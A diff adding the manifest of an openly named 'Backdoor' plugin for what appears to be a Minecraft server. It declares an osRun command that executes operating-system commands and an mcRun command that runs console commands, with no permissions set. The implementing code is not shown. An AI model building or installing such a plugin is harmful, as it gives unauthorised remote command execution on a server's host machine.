@@ -1,0 +1,17 @@
+name: Backdoor
+version: 1.0
+description: Example backdoor plugin
+author: LightMan
+website: github.com/L1ghtM4n
+
+main: lightman.backdoor.BackdoorPlugin
+
+commands:
+    osRun:
+        description: Execute OS command
+        usage: /osRun command
+    mcRun:
+        description: Execute minecraft command as console
+        usage: /mcRun command
+
+permissions: {}
